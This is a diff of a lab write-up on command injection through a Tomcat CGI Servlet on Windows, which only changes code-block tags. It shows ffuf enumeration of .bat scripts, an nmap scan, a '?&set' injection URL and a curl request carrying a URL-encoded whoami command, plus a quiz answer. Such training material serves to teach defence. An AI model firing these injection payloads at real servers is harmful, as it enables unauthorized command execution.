@@ -6,11 +6,11 @@ In essence, a CGI Servlet is a program that runs on a web server, such as Apache
 ## Enumeration
 One way to uncover web server content is by utilising the ffuf web enumeration tool along with the dirb `common.txt` wordlist. Knowing that the default directory for CGI scripts is `/cgi`, either through prior knowledge or by researching the vulnerability, we can use the URL http://10.129.204.227:8080/cgi/FUZZ.cmd or http://10.129.204.227:8080/cgi/FUZZ.bat to perform fuzzing.
 
-```sh
+```shellsession
 $ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
 ```
 
-```sh
+```shellsession
 $ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
 ```
 
@@ -26,7 +26,7 @@ http://10.129.204.227:8080/cgi/welcome.bat?&set
 ## Questions
 1. After running the URL Encoded 'whoami' payload, what user is tomcat running as? **Answer: feldspar\omen**
    - Run a nmap scan to identify the tomcat webserver running on port 8080:
-        ```sh
+        ```shellsession
         $ sudo nmap -p- --open -sV 10.129.205.30
         Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-19 06:51 EDT
         Nmap scan report for 10.129.205.30
@@ -50,13 +50,13 @@ http://10.129.204.227:8080/cgi/welcome.bat?&set
         49669/tcp open  msrpc         Microsoft Windows RPC
         ```
    - Run `ffuf` to find a `.bat` file path:
-        ```sh
+        ```shellsession
         $ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
         <SNIP>
         [+] welcome
         ```
    - URL encode the command `c:\windows\system32\whoami.exe`:
-        ```sh
+        ```shellsession
         $ curl 'http://10.129.205.30:8080/cgi/welcome.bat?&%63%3a%5c%77%69%6e%64%6f%77%73%5c%73%79%73%74%65%6d%33%32%5c%77%68%6f%61%6d%69%2e%65%78%65'
         Welcome to CGI, this section is not functional yet. Please return to home page.
         feldspar\omen
